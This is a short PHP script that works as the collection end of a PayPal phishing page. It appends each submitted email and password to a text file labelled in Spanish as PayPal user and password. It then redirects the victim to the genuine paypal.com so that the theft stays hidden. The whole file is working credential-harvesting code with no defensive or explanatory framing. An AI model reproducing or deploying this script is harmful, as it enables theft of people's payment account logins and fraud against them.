<?php

file_put_contents("usuarios.txt", "Usuario de paypal:" . $_POST['login_email'] . " Contraseña: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com');
exit();
?>
